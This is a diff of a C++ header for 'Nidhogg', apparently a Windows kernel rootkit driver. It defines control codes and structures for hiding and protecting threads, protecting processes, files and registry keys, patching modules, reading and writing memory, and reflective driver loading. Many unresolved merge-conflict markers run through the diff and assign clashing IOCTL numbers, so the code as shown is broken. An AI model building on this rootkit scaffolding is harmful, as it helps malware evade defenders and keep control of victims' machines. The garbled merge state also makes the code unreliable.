@@ -4,14 +4,27 @@
 #include "FastMutex.h"
 #include "AutoLock.h"
 
+// #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
 #define DRIVER_PREFIX "Nidhogg: "
+#define DRIVER_NAME L"\\Driver\\Nidhogg"
 #define DRIVER_DEVICE_NAME L"\\Device\\Nidhogg"
 #define DRIVER_SYMBOLIC_LINK L"\\??\\Nidhogg"
 #define DRIVER_TAG 'hdiN'
 #define OB_CALLBACKS_ALTITUDE L"31105.6171"
 #define REG_CALLBACK_ALTITUDE L"31122.6172"
 
-// ** IOCTLS ********************************************************************************************
+#define REGISTERED_OB_CALLBACKS 2
+#define SUPPORTED_HOOKED_NTFS_CALLBACKS 1
+#define MAX_PATCHED_MODULES 256
+#define MAX_PIDS 256
+#define MAX_TIDS 256
+#define MAX_PATH 260
+#define MAX_FILES 256
+#define MAX_REG_ITEMS 256
+#define REG_VALUE_LEN 260
+#define REG_KEY_LEN 255
+
+// ** IOCTLS **********************************************************************************************
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -20,6 +33,7 @@
 #define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -80,12 +94,25 @@
 >>>>>>> afd6daf (Nidhogg v0.2)
 =======
 >>>>>>> f35ada5 (Added process signature change)
+=======
+#define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
+<<<<<<< HEAD
+#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> ff81531 (Added thread protection)
+=======
+#define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> f16e748 (Added thread hiding)
 
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
+<<<<<<< HEAD
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 #define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -101,17 +128,26 @@
 #define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
 >>>>>>> f35ada5 (Added process signature change)
 // *****************************************************************************************************
+=======
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> ff81531 (Added thread protection)
+=======
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
+>>>>>>> f16e748 (Added thread hiding)
 
-#define MAX_PATCHED_MODULES 256
-#define MAX_PIDS 256
-#define MAX_PATH 260
-#define MAX_FILES 256
-#define MAX_REG_ITEMS 256
-#define REG_VALUE_LEN 260
-#define REG_KEY_LEN 255
-#define SUPPORTED_HOOKED_NTFS_CALLBACKS 1
+#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
+// *******************************************************************************************************
 
 // Prototypes.
+NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
 DRIVER_UNLOAD NidhoggUnload;
 DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
@@ -150,17 +186,23 @@ typedef NTSTATUS(NTAPI* tNtfsIrpFunction)(
 	PDEVICE_OBJECT DeviceObject,
 	PIRP Irp);
 
+typedef NTSTATUS(NTAPI* tIoCreateDriver)(
+	PUNICODE_STRING DriverName,
+	PDRIVER_INITIALIZE InitializationFunction
+	);
+
 // Globals.
 PVOID RegistrationHandle = NULL;
 
 struct EnabledFeatures {
-	bool FunctionPatching   = true;
-	bool WriteData			= true;
-	bool ReadData			= true;
-	bool RegistryFeatures	= true;
-	bool ProcessProtection	= true;
-	bool FileProtection		= true;
-	bool FileHiding			= true;
+	bool DriverReflectivelyLoaded = false;
+	bool FunctionPatching		  = true;
+	bool WriteData				  = true;
+	bool ReadData				  = true;
+	bool RegistryFeatures		  = true;
+	bool ProcessProtection		  = true;
+	bool ThreadProtection		  = true;
+	bool FileProtection			  = true;
 };
 EnabledFeatures Features;
 
@@ -253,6 +295,22 @@ struct ProcessGlobals {
 	}
 };
 ProcessGlobals pGlobals;
+
+struct ThreadsList {
+	int TidsCount;
+	ULONG Threads[MAX_TIDS];
+};
+
+struct ThreadGlobals {
+	ThreadsList ProtectedThreads;
+	FastMutex Lock;
+
+	void Init() {
+		ProtectedThreads.TidsCount = 0;
+		Lock.Init();
+	}
+};
+ThreadGlobals tGlobals;
 // ----------------------------------------------------------------------------
 
 // --- FilesUtils structs -----------------------------------------------------
